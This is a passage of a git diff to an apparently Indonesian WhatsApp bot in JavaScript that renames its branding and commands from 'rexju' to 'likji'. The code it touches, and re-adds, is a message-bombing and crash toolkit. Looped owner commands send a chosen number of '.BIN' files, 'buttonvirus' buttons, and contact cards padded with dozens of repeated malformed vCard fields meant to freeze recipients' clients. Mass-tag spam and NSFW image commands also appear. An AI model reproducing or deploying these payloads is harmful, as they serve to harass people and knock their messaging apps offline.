 let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${haikal.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
 let anu = await store.chats.all().map(v => v.id)
 m.reply(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
@@ -1658,7 +1658,7 @@ m.reply('*Success Broadcast*')
 }
 break
 //=================================================//
-case 'rexjubutton': case 'rexjukangbuttton': case 'testbutton': case 'inibutton': 
+case 'likjibutton': case 'likjikangbuttton': case 'testbutton': case 'inibutton': 
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1671,7 +1671,7 @@ const buttons = [
 {buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
 ]
 const buttonMessage = {
-text: "© °rexju°͢",
+text: "© 𝐿𝑖𝑥𝑥𝑧𝑦͢",
 footerText: 'Pe',
 buttons: buttons,
 headerType: 1
@@ -1680,7 +1680,7 @@ haikal.sendMessage(m.chat, buttonMessage)
 }
  break
 //=================================================//
-case 'rexjutag': case 'rexjubar':  {
+case 'likjitag': case 'likjibar':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
@@ -1688,7 +1688,7 @@ haikal.sendMessage(m.chat, { text : `${buttonkal}` , mentions: participants.map(
 }
 break
 //=================================================//
-case 'hiya': case 'rexjuoke': {
+case 'hiya': case 'likjioke': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1696,19 +1696,19 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
 anuin = fs.readFileSync('./baseikal/sound/ngeselin.BIN')
-haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `© °rexju°${ngazap(prefix)}.BIN`, title: `© °rexju°${ngazap(prefix)}.BIN` }, { quoted: doc })
+haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `© 𝐿𝑖𝑥𝑥𝑧𝑦${ngazap(prefix)}.BIN`, title: `© 𝐿𝑖𝑥𝑥𝑧𝑦${ngazap(prefix)}.BIN` }, { quoted: doc })
 }
 }
 break
 //=================================================//
-case 'rexjutod': case 'rexjuewe': {
+case 'likjitod': case 'likjiewe': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
- const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© © °rexju°͢${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© °rexju°͢\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
+ const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© 𝐿𝑖𝑥𝑥𝑧𝑦͢\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
 haikal.sendContact(m.chat, global.ownerr, fkontaak)
 }
 }
@@ -1725,7 +1725,7 @@ haikal.sendMessage(m.chat, { image: anu, caption: `${buttonkal}` }, { quoted: m}
 }
 break
 //=================================================//
-case 'rexjubokep': case 'rexjungentod': {
+case 'likjibokep': case 'likjingentod': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1738,7 +1738,7 @@ haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${co
 }
 break
 //=================================================//
-case 'rexjusange': {
+case 'likjisange': {
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) return m.reply(mess.group)
 if (!isBotAdmins) return m.reply(mess.botAdmin)
@@ -1770,7 +1770,7 @@ caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}
 bugcrot
 bugahay `,
 }
-haikal.sendMessage(m.chat, anuala, `© °rexju°͢${ngazap(prefix)}`, m)
+haikal.sendMessage(m.chat, anuala, `© 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`, m)
 }
 }
 break
@@ -1782,7 +1782,7 @@ if (!AntiNsfww) return m.reply(mess.nsfw)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 const bugcrot = {
 image: {url:waifudd.data.url},
-caption: `© © °rexju°${buttonkal}`,
+caption: `© © 𝐿𝑖𝑥𝑥𝑧𝑦${buttonkal}`,
 } 
 haikal.sendMessage(m.chat, bugcrot, { quoted: m }).catch(err => {
  return('Error!')
@@ -1797,7 +1797,7 @@ m.reply(mess.wait)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
  const bugahay = {
 image: {url:waifudd.data.url},
-caption: `© © °rexju°${buttonkal}`,
+caption: `© © 𝐿𝑖𝑥𝑥𝑧𝑦${buttonkal}`,
 } 
 haikal.sendMessage(m.chat, bugahay, { quoted: m }).catch(err => {
  return('Error!')
@@ -1873,7 +1873,7 @@ haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
 }
 break
 //=================================================//
-case 'rexjuhu': case 'rexju1': {
+case 'likjihu': case 'likji1': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1886,7 +1886,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'rexjuhi': case 'rexju2': {
+case 'likjihi': case 'likji2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1899,7 +1899,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'rexjuha': case 'rexju3': {
+case 'likjiha': case 'likji3': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1912,7 +1912,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'rexjuhe': case 'rexju4': {
+case 'likjihe': case 'likji4': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1925,7 +1925,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'rexjuba': case 'rexju5': {
